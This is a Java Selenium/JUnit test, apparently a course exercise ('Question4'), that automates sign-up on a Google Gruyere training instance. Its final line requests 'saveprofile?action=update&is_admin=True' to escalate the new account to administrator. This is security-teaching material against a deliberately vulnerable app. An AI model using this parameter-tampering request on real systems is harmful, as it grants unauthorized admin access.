package org.example;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.time.Duration;
import java.util.List;
import java.util.Random;

import org.apache.commons.io.FileUtils;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.openqa.selenium.*;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

public class Question4 {
    private WebDriver driver;
    private WebDriverWait wait;

    private String url;


    @BeforeEach
    void setUp() {
        driver = new FirefoxDriver();
        driver.manage().timeouts().implicitlyWait(Duration.ofSeconds(3));
        wait = new WebDriverWait(driver, Duration.ofSeconds(10));
        url = "http://google-gruyere.appspot.com/363905908632117481656375832475944051931";

    }

    @Test
    void testGruyere() {
        driver.get(url);
        driver.findElement(By.linkText("Sign up")).click();
        driver.findElement(By.name("uid")).sendKeys("toto"+new Random().nextFloat(10000));
        driver.findElement(By.name("pw")).sendKeys("toto");
        driver.findElement(By.name("pw")).sendKeys(Keys.ENTER);
        driver.findElement(By.cssSelector("tr:nth-child(4) input")).click();
        {
            List<WebElement> elements = driver.findElements(By.cssSelector(".message"));
            assert(elements.size() > 0);
        }
        driver.findElement(By.linkText("Home")).click();
        driver.get(url+"/saveprofile?action=update&is_admin=True");
    }

    @AfterEach
    void tearDown() {
        if (driver != null) {
            //driver.quit();
        }
    }
}
